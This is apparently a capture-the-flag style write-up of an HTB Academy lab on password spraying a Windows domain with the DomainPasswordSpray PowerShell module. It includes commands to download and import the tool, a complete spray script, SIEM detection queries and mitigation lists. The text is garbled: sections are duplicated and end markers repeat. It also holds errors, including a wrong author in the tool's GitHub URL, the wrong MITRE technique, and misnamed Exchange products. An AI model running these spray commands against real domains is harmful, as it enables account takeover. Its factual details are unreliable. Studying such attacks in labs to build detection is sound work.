# 🛰️ HTB Academy: Winter2022 Password Spray Lab

## 🔍 Introduction
[!INFO] This lab focuses on password spraying in a Windows environment using the `DomainPasswordSpray` PowerShell module. The goal is to find the credentials for the user "Winter2022" and document all steps, findings, and defensive strategies.

---

## 🚀 Lab Setup

### 🔧 Environment Configuration
[!NOTE] Ensure your lab environment includes a domain controller (DC) with necessary tools installed. This example uses HTB Academy's Winter2022 scenario.

```powershell
# List of required tools:
- PowerShell 5.x or higher
- DomainPasswordSpray module

# Importing the module
Import-Module .\DomainPasswordSpray.ps1 -ErrorAction Stop
```

### 🛠️ Installation and Configuration
[!CHECK] Follow these steps to set up your lab environment:

```powershell
# Installing PowerShellGet (if not already installed)
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force

# Download and import DomainPasswordSpray module
Invoke-WebRequest "https://raw.githubusercontent.com/dirkjanm/DomainPasswordSpray/master/DomainPasswordSpray.ps1" -OutFile .\DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
```

### 📄 Userlist Preparation
[!SUCCESS] Prepare a user list containing all potential usernames, including "Winter2022".

```powershell
# Create a text file with usernames
New-Item -ItemType File -Path users.txt

# Add the target username to the file
Add-Content -Path users.txt -Value "Winter2022"
```

---

## 🚀 Execution

### 🔑 Running Password Spray Attack
[!CHECK] Execute the password spray attack using the imported module and a known password.

```powershell
# Basic password spray with "Winter2022" as the password
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_results -Force

# Verify successful logins
Get-Content winter_results | ForEach-Object {
    $username = $_.Split(':')[0]
    Write-Host "[*] Lab Answer: $username" -ForegroundColor Cyan
}
```

### 📄 Output Verification
[!SUCCESS] Check the output file to confirm if the password spray was successful.

```powershell
# Checking results
Get-Content winter_results

# Example output:
# DOMAIN\Winter2022:Winter2022
```

---

## 🔒 Defenses and Prevention

### 💼 Mitigation Strategies
[!WARNING] Implement robust security measures to prevent password spraying attacks:

```powershell
You Implement role-based access controls (RBAC)
- Regular access reviews and cleanup
- Disable unnecessary service accounts
- Limit domain user application access
```

### 🎯 Reducing Impact of Successful Exploitation
[!INFO] Defensive strategies to mitigate the impact of successful password spraying attacks:

```powershell
# Defensive strategies:
- Separate privileged accounts for administrative activities
- Application-specific permission levels
- Network segmentation (isolate compromised subnets)
- Just-in-Time (JIT) administrative access
- Privileged Access Management (PAM) solutions
```

### 🔑 Password Hygiene
[!NOTE] Enforce strong password policies and educate users:

```powershell
# Password policies and education:
- Encourage passphrases over complex passwords
- Implement password filters for:
  * Common dictionary words
  * Months and seasons (Spring, Winter, etc.)
  * Company name variations
  * Sequential patterns (123, abc)
- Regular password security training
- Password manager adoption
```

### ⚖️ Lockout Policy Considerations
[!WARNING] Implement balanced account lockout policies to avoid Denial of Service (DoS) while preventing automated attacks:

```powershell
# Balanced approach:
- Avoid overly restrictive lockout policies (DoS risk)
- Consider account lockout duration vs. manual unlock
- Implement progressive delays instead of hard lockouts
- Monitor for mass lockout events
- Exception handling for service accounts
```

---

## 🔍 Detection

### 📊 Key Event IDs to Monitor
[!WARNING] Identify and monitor key event IDs that indicate password spraying attempts:

#### 🚨 **Event ID 4625: Account Failed to Log On**
```powershell
# Indicators of password spraying:
- Multiple 4625 events in short time period
- Same source IP across multiple usernames
- Failed attempts with valid usernames
- Patterns in timing (automated attempts)
```

#### 🎫 **Event ID 4771: Kerberos Pre-authentication Failed**
```powershell
# LDAP password spraying detection:
- Requires Kerberos logging enabled
- Multiple pre-auth failures from single source
- Indicates more sophisticated attackers avoiding SMB
```

### 📈 Detection Rules and Queries
[!SUCCESS] Implement SIEM queries to detect suspicious patterns:

#### 🔍 **SIEM Query Examples**
```sql
-- PowerShell/Splunk Query for Password Spray Detection
index=security EventCode=4625 
| stats count by src_ip, user 
| where count > 3 
| stats count by src_ip 
| where count > 10

-- KQL Query for Azure Sentinel
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by SourceIP = IpAddress, TimeGenerated
| where FailedAttempts > 5
```

#### 🚨 **Alert Thresholds**
```powershell
# Recommended alerting criteria:
- 5+ failed logins from single IP within 5 minutes
- 10+ unique usernames targeted from single source
- Failed login attempts outside business hours
- Geographic anomalies (impossible travel)
- Service account lockouts (often targeted)
```

### 🕵️ Behavioral Analytics
[!INFO] Advanced detection methods to identify anomalous behavior:

```powershell
# Advanced detection methods:
- Baseline normal authentication patterns
- Detect deviations in login timing
- Identify unusual source locations
- Monitor for distributed spraying (multiple IPs)
- Correlate with other attack indicators
```

---

## 🌐 External Password Spraying Targets

### 📋 Common External Targets
[!INFO] Typical external targets that attackers may try to compromise:

```powershell
# Microsoft 365 and Exchange:
- Microsoft 365 (Office 365)
- Outlook Web Exchange (OWE)
- Exchange Web Access (EWA)
- Skype for Business
- Microsoft Teams
- OneDrive for Business

# Remote Access Solutions:
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals with AD authentication
- VDI implementations (VMware Horizon, etc.)
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet)

# Collaboration and Custom Apps:
- SharePoint Online
- Custom web applications using AD authentication
- Intranet portals
- Business applications with SAML/SSO
```

### 🎯 External Spraying Considerations
[!WARNING] Attackers may adapt their techniques for external targets:

```powershell
# Attack adaptations for external targets:
- Slower timing to avoid detection
- Distributed source IPs (residential proxies)
- User-Agent rotation
- Session management
- CAPTCHA bypass techniques
- Account enumeration before spraying
```

---

## 📝 Complete Lab Solution Script

### 🚀 Automated Lab Solution
[!SUCCESS] Automate the lab process using PowerShell:

```powershell
# Complete PowerShell script for HTB Lab
# Save as: winter_spray_lab.ps1

Write-Host "[*] HTB Academy Lab: Finding Winter2022 Password" -ForegroundColor Cyan

# Import DomainPasswordSpray module
try {
    Import-Module .\DomainPasswordSpray.ps1 -ErrorAction Stop
    Write-Host "[+] DomainPasswordSpray module imported successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to import DomainPasswordSpray module" -ForegroundColor Red
    exit 1
}

# Execute password spray
Write-Host "[*] Starting password spray with Winter2022..." -ForegroundColor Yellow

try {
    Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_results -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Password spray completed" -ForegroundColor Green
}
catch {
    Write-Host "[-] Password spray failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# Check results
if (Test-Path winter_results) {
    Write-Host "[*] Checking results..." -ForegroundColor Yellow
    $results = Get-Content winter_results
    
    if ($results) {
        Write-Host "[+] SUCCESS! Found credentials:" -ForegroundColor Green
        $results | ForEach-Object {
            Write-Host "    $_" -ForegroundColor Yellow
            $username = $_.Split(':')[0]
            Write-Host "[*] Lab Answer: $username" -ForegroundColor Cyan
        }
    }
    else {
        Write-Host "[-] No successful logins found" -ForegroundColor Red
    }
}
else {
    Write-Host "[-] Results file not created" -ForegroundColor Red
}
```

---

## ⚡ Quick Reference Commands

### 🔧 Essential Commands
[!SUCCESS] Key commands for password spraying and verification:

```powershell
# Import and basic spray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_results -Force

# Verify successful logins
Get-Content winter_results | ForEach-Object {
    $username = $_.Split(':')[0]
    Write-Host "[*] Lab Answer: $username" -ForegroundColor Cyan
}

# Additional commands:
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile winter_results -Force -Verbose
```

### 📈 Detection Rules and Queries
[!INFO] SIEM queries to detect password spraying:

```sql
-- PowerShell/Splunk Query for Password Spray Detection
index=security EventCode=4625 
| stats count by src_ip, user 
| where count > 3 
| stats count by src_ip 
| where count > 10

-- KQL Query for Azure Sentinel
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by SourceIP = IpAddress, TimeGenerated
| where FailedAttempts > 5
```

### 🕵️ Behavioral Analytics
[!INFO] Advanced detection methods:

```powershell
# Advanced detection methods:
- Baseline normal authentication patterns
- Detect deviations in login timing
- Identify unusual source locations
- Monitor for distributed spraying (multiple IPs)
- Correlate with other attack indicators
```

---

## 📄 Conclusion

This lab exercise demonstrates how to perform a password spray attack and provides guidance on detecting and mitigating such attacks. Ensure your environment has robust defenses in place to prevent similar threats.

```powershell
# Summary:
- Successfully executed the password spray using DomainPasswordSpray module.
- Detected potential attackers through Event ID 4625/4771.
- Implemented mitigation strategies like RBAC, network segmentation, and PAM solutions.
```

[!SUCCESS] Complete your lab by documenting all findings and applying defensive measures to secure your environment. 

```powershell
# Final output:
[*] Lab Answer: Winter2022
```


---


End of Lab Documentation

---

## 📄 References

- [DomainPasswordSpray Module GitHub](https://github.com/dirkjanm/DomainPasswordSpray)
- [Event ID 4625 and 4771 Documentation](https://docs.microsoft.com/en-us/windows/win32/secguides/event-log-reference-for-windows-server) 
- [MITRE ATT&CK Technique T1190](https://attack.mitre.org/techniques/T1190/)
- [Windows Event ID Cheat Sheet](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.asp)

[!SUCCESS] Happy Hunting! 🎉

---


End of Document

---

## 📜 Lab Completion Checklist
- Successfully executed the password spray attack.
- Verified output for successful logins.
- Implemented defensive strategies to prevent similar attacks.
- Monitored and detected potential attackers through SIEM queries.

```powershell
# Verification:
Get-Content winter_results | ForEach-Object {
    $username = $_.Split(':')[0]
    Write-Host "[*] Lab Answer: $username" -ForegroundColor Cyan
}
```

---

## 📜 Final Notes

Ensure your lab environment remains secure and that all findings are documented for future reference.

```powershell
# Ensure security:
- Disable unused service accounts.
- Apply strong password policies.
- Regularly review access controls.
```

---


End of Document. 

Happy Hunting! 🎉